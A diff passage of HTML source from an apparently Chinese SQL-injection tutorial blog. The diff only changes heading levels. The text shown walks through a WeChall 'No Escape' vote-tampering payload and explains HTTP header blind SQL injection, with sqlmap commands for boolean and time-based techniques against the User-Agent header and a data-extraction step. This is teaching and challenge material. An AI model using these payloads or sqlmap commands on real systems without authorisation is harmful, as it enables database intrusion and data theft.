 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;前面加&lt;code&gt;-&lt;/code&gt;是为了引起报错，从而让后面的&lt;code&gt;union select&lt;/code&gt;得以覆盖报错位。此外，使用&lt;code&gt;or 1=2&lt;/code&gt;永假条件也可以强制报错。&lt;/p&gt;
-&lt;h3 id=&#34;第三关&#34;&gt;第三关
-&lt;/h3&gt;&lt;p&gt;访问：&lt;a class=&#34;link&#34; href=&#34;https://www.wechall.net/challenge/no_escape/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;h4 id=&#34;第三关&#34;&gt;第三关
+&lt;/h4&gt;&lt;p&gt;访问：&lt;a class=&#34;link&#34; href=&#34;https://www.wechall.net/challenge/no_escape/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;[WeChall] No Escape&lt;/a&gt;，我们的任务是修改任意一个候选人的票数为111，且程序提到票数达到100时会重制，所以靠手点肯定是不行的。&lt;/p&gt;
 &lt;p&gt;任意点击投票按钮发现网址后会跟着一个参数&lt;code&gt;?vote_for=xxx&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;查看源码(核心)：&lt;/strong&gt;&lt;/p&gt;
@@ -1877,19 +2172,19 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vote_for&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wagenk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;http-头注盲注详解&#34;&gt;HTTP 头注盲注详解
-&lt;/h1&gt;&lt;h2 id=&#34;基本概念&#34;&gt;基本概念
-&lt;/h2&gt;&lt;blockquote&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http-头注盲注详解&#34;&gt;HTTP 头注盲注详解
+&lt;/h2&gt;&lt;h3 id=&#34;基本概念&#34;&gt;基本概念
+&lt;/h3&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;HTTP 头注盲注&lt;/strong&gt;（HTTP Header Blind SQL Injection）是一种特殊的 SQL 注入攻击，攻击者通过篡改 HTTP 请求头部字段（如 User-Agent、Referer、Cookie、X-Forwarded-For 等），将恶意 SQL 代码注入到后端数据库查询中，同时由于应用程序不返回数据库错误信息或查询结果，只能通过页面响应差异（布尔值）或时间延迟来判断注入结果，从而逐位提取敏感数据的攻击方式。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理
-&lt;/h2&gt;&lt;ul&gt;
+&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理
+&lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;开发者将 HTTP 头信息直接写入数据库（如日志记录功能），未做过滤或转义处理&lt;/li&gt;
 &lt;li&gt;典型场景：&lt;code&gt;insert into logs(username, ip, useragent) values(&#39;admin&#39;, &#39;127.0.0.1&#39;, &#39;user-agent内容&#39;);&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;全局过滤常只针对 GET/POST 参数，忽略 HTTP 头信息，导致绕过防御&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;常见注入点&#34;&gt;常见注入点
-&lt;/h2&gt;&lt;p&gt;HTTP 头中可能存在注入漏洞的字段包括：&lt;/p&gt;
+&lt;h3 id=&#34;常见注入点&#34;&gt;常见注入点
+&lt;/h3&gt;&lt;p&gt;HTTP 头中可能存在注入漏洞的字段包括：&lt;/p&gt;
 &lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
@@ -1931,9 +2226,9 @@
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;使用sqlmap注入&#34;&gt;使用sqlmap注入
-&lt;/h2&gt;&lt;h3 id=&#34;前置准备抓取目标-http-请求包&#34;&gt;前置准备：抓取目标 HTTP 请求包
-&lt;/h3&gt;&lt;p&gt;sqlmap 处理 HTTP 头注入时，最便捷的方式是先抓取完整的 HTTP 请求包并保存为文本文件（通常命名为&lt;code&gt;request.txt&lt;/code&gt;）。&lt;/p&gt;
+&lt;h3 id=&#34;使用sqlmap注入&#34;&gt;使用sqlmap注入
+&lt;/h3&gt;&lt;h4 id=&#34;前置准备抓取目标-http-请求包&#34;&gt;前置准备：抓取目标 HTTP 请求包
+&lt;/h4&gt;&lt;p&gt;sqlmap 处理 HTTP 头注入时，最便捷的方式是先抓取完整的 HTTP 请求包并保存为文本文件（通常命名为&lt;code&gt;request.txt&lt;/code&gt;）。&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;抓包工具&lt;/strong&gt; ：Burp Suite&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;抓包示例&lt;/strong&gt; ：
@@ -1965,10 +2260,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;close&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;核心操作步骤&#34;&gt;核心操作步骤
-&lt;/h3&gt;&lt;p&gt;sqlmap 针对 HTTP 头注盲注的核心逻辑是：指定请求文件 → 标记注入点 → 选择盲注类型 → 自动化检测 / 提取数据。&lt;/p&gt;
-&lt;h4 id=&#34;基础命令检测-http-头注入漏洞&#34;&gt;基础命令（检测 HTTP 头注入漏洞）
-&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;指定单个 HTTP 头注入点&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;h4 id=&#34;核心操作步骤&#34;&gt;核心操作步骤
+&lt;/h4&gt;&lt;p&gt;sqlmap 针对 HTTP 头注盲注的核心逻辑是：指定请求文件 → 标记注入点 → 选择盲注类型 → 自动化检测 / 提取数据。&lt;/p&gt;
+&lt;h5 id=&#34;基础命令检测-http-头注入漏洞&#34;&gt;基础命令（检测 HTTP 头注入漏洞）
+&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;指定单个 HTTP 头注入点&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;以&lt;code&gt;User-Agent&lt;/code&gt;头为例，在请求文件中找到&lt;code&gt;User-Agent&lt;/code&gt;行，在需要注入的位置添加&lt;code&gt;*&lt;/code&gt;标记注入点，再执行 sqlmap 命令：&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;修改后的 request.txt&lt;/strong&gt; （关键：&lt;code&gt;User-Agent: *&lt;/code&gt;）：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2009,8 +2304,8 @@
 &lt;/ul&gt;
 &lt;hr&gt;
 &lt;p&gt;如果 sqlmap 未自动识别盲注类型，可手动指定布尔盲注（B）或时间盲注（T）：&lt;/p&gt;
-&lt;h4 id=&#34;布尔盲注最常用&#34;&gt;布尔盲注（最常用）
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;h5 id=&#34;布尔盲注最常用&#34;&gt;布尔盲注（最常用）
+&lt;/h5&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2020,8 +2315,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -r request.txt -p User-Agent --technique B --dbms MySQL --batch -v &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;时间盲注无页面响应差异时&#34;&gt;时间盲注（无页面响应差异时）
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h5 id=&#34;时间盲注无页面响应差异时&#34;&gt;时间盲注（无页面响应差异时）
+&lt;/h5&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2031,8 +2326,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -r request.txt -p User-Agent --technique T --delay &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; --time-sec &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;提取数据&#34;&gt;提取数据
-&lt;/h4&gt;&lt;p&gt;确认存在漏洞后，可通过在下面的基础命令上添加之前学习的参数提取数据库、表、字段、数据：&lt;/p&gt;
+&lt;/div&gt;&lt;h5 id=&#34;提取数据&#34;&gt;提取数据
+&lt;/h5&gt;&lt;p&gt;确认存在漏洞后，可通过在下面的基础命令上添加之前学习的参数提取数据库、表、字段、数据：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
